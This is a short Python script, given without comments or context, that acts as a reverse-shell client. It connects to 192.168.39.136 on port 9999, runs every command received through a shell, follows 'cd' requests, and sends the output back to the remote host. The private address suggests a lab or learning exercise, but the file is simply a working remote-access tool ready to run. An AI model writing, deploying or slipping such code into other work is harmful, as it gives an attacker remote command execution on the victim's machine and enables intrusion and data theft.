import socket
import os
import subprocess

s = socket.socket()
host = "192.168.39.136"
port = 9999

try:
    s.connect((host, port))

    while True:
        receive_data = s.recv(1024)

        if receive_data[:2].decode("utf-8") == "cd":
            os.chdir(receive_data[3:].decode("utf-8"))

        if len(receive_data) > 0:
            cmd = subprocess.Popen(receive_data.decode(
                "utf-8"), shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

            output_byte = cmd.stdout.read() + cmd.stderr.read()
            output_str = str(output_byte, "utf-8")
            currentWD = os.getcwd() + "> "
            s.send(str.encode(output_str + currentWD))

            print(output_str)

except Exception as e:
    print(e)